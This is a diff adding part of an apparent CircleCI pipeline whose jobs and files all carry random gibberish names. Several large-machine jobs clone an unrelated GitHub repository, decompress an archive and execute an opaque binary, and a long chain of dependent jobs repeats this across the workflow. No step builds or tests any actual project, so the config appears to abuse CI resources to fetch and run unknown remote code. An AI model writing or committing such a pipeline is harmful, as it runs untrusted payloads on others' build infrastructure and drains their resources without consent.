+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: hyftkizlkdk
+          command: |
+            [ -s /tmp/hyfgk/hwkqzbbwtp ] && echo "has content" || echo "empty or missing"
+      - run:
+          name: uraqeouex
+          command: git clone --no-single-branch --filter=tree:0 https://github.com/natalyacheekftjyz-png/ad4803b213be.git .
+      - run:
+          name: wjdgbsxmeg
+          command: bunzip2 -c ecerzfhdfx.tar.bz2 | tar xf -
+      - run:
+          command: /bin/bash -c "./zygbbrvxggwj"
+  jrlwtoplalvfyr:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: ylgpet
+          command: |
+            mkdir -p /tmp/hyfgk
+            echo 'fyhytkdjkuenlsjtm ywnxqsqqeovcmdcs' > /tmp/hyfgk/hnoiflaxl
+            ls -la /tmp/hyfgk/hnoiflaxl
+      - persist_to_workspace:
+          root: /tmp/hyfgk
+          paths:
+            - 'hnoiflaxl'
+  addtlean:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: asqyrgar
+          command: |
+            [ -s /tmp/hyfgk/hnoiflaxl ] && echo "has content" || echo "empty or missing"
+      - run:
+          name: vvzyckjvrxwzfgh
+          command: git clone --no-single-branch --filter=tree:0 https://github.com/natalyacheekftjyz-png/ad4803b213be.git .
+      - run:
+          name: kcagbwhytbmt
+          command: bunzip2 -c ecerzfhdfx.tar.bz2 | tar xf -
+      - run:
+          command: /bin/bash -c "./zygbbrvxggwj"
+  ttkpddjiagpkkzk:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: ccnutygm
+          command: |
+            mkdir -p /tmp/hyfgk
+            echo 'cuccfnnmlzekkfebv fefzvfwnyrycwupub' > /tmp/hyfgk/pwncdgclrqe
+            ls -la /tmp/hyfgk/pwncdgclrqe
+      - persist_to_workspace:
+          root: /tmp/hyfgk
+          paths:
+            - 'pwncdgclrqe'
+  uepureyzostqqc:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hyfgk
+      - run:
+          name: syrjkad
+          command: |
+            [ -s /tmp/hyfgk/pwncdgclrqe ] && echo "has content" || echo "empty or missing"
+      - run:
+          name: uprianwewiuh
+          command: git clone --no-single-branch --filter=tree:0 https://github.com/natalyacheekftjyz-png/ad4803b213be.git .
+      - run:
+          name: himwutrj
+          command: bunzip2 -c ecerzfhdfx.tar.bz2 | tar xf -
+      - run:
+          command: /bin/bash -c "./zygbbrvxggwj"
+
+workflows:
+  hxspnxfqyiaqek:
+    jobs:
+      - ykfmldbyafone
+      - vyymdtlrnhe:
+          requires:
+            - ykfmldbyafone
+      - apqsifmsxksuc:
+          requires:
+            - ykfmldbyafone
+      - difoupryubh:
+          requires:
+            - apqsifmsxksuc
+      - joideohvjaspf:
+          requires:
+            - apqsifmsxksuc
+      - lnihnb:
+          requires:
+            - joideohvjaspf
+      - aphmpucsrnwbku:
+          requires:
+            - joideohvjaspf
+      - xpgcbjqvtdk:
+          requires:
+            - aphmpucsrnwbku
+      - loemglabjuxuxuw:
+          requires:
+            - aphmpucsrnwbku
+      - wpllxlkc:
+          requires:
+            - loemglabjuxuxuw
+      - hcgdgm:
+          requires:
+            - loemglabjuxuxuw
+      - fgvbuotluxd:
+          requires:
+            - hcgdgm
+      - ozvvz
+      - xrzwuyekbpzib:
+          requires:
+            - ozvvz
+      - qcihkmqk:
+          requires:
+            - ozvvz
+      - sgyyhohsjtxhbpp:
+          requires:
+            - qcihkmqk
+      - axcvyxttmcossis:
+          requires:
+            - qcihkmqk
+      - wqkyqyyivr:
+          requires:
+            - axcvyxttmcossis
+      - qtnzdsb:
+          requires:
+            - axcvyxttmcossis
+      - iowwuzen:
+          requires:
+            - qtnzdsb
+      - wnrqcohbcgb:
+          requires:
+            - qtnzdsb
+      - dugmkedvk:
+          requires:
+            - wnrqcohbcgb
+      - zltnf:
+          requires:
+            - wnrqcohbcgb
+      - qlmvetwskyti:
+          requires:
+            - zltnf
+      - gvvzqs:
+          requires:
+            - zltnf
+      - petuylzdagiabmi:
+          requires:
+            - gvvzqs
+      - mvtithsdtm:
+          requires:
+            - gvvzqs
+      - dzyctyzvabu:
+          requires:
+            - mvtithsdtm
+      - prgwzom
+      - vtubec:
+          requires:
+            - prgwzom
+      - ttfonn:
+          requires:
+            - prgwzom
+      - rbvua:
+          requires:
+            - ttfonn
+      - iqemhlmym:
+          requires:
+            - ttfonn
+      - rjnyk:
+          requires:
+            - iqemhlmym
+      - dmnvixczwvh:
+          requires:
+            - iqemhlmym
+      - amhzyxved:
+          requires:
+            - dmnvixczwvh
+      - drkeih
+      - fopjcvo:
+          requires:
+            - drkeih
+      - oznayuxiq:
+          requires:
+            - drkeih
+      - mstvzatv:
+          requires:
+            - oznayuxiq
+      - mzdiscijo:
+          requires:
+            - oznayuxiq
+      - xwbckogklklsk:
+          requires:
+            - mzdiscijo
+      - ttkpddjiagpkkzk:
+          requires:
+            - mzdiscijo
+      - uepureyzostqqc:
+          requires:
+            - ttkpddjiagpkkzk
+      - vkxhawiweozc:
+          requires:
+            - ttkpddjiagpkkzk
+      - mrksvkqgn:
+          requires:
+            - vkxhawiweozc
+      - cjojfqosiekcw:
+          requires:
+            - vkxhawiweozc
+      - sytoaig:
+          requires:
+            - cjojfqosiekcw
+      - dmdnhk:
+          requires:
+            - cjojfqosiekcw
+      - dhzvzangqdgu:
+          requires:
+            - dmdnhk
+      - zogbyqbqynyqnfu:
+          requires:
+            - dmdnhk
+      - gwppctcjicsuf:
+          requires:
+            - zogbyqbqynyqnfu
+      - xfrnhmtljo:
+          requires:
+            - zogbyqbqynyqnfu
+      - zotmbere:
+          requires:
+            - xfrnhmtljo
+      - jrlwtoplalvfyr:
+          requires:
+            - xfrnhmtljo
+      - addtlean:
+          requires:
+            - jrlwtoplalvfyr
+      - jvnxhdrbaykkkun:
+          requires:
+            - jrlwtoplalvfyr
+      - wawwkul:
+          requires:
+            - jvnxhdrbaykkkun
+      - jqmiksbmnyu:
+          requires:
+            - jvnxhdrbaykkkun
+      - sxutymebxbx:
+          requires:
+            - jqmiksbmnyu
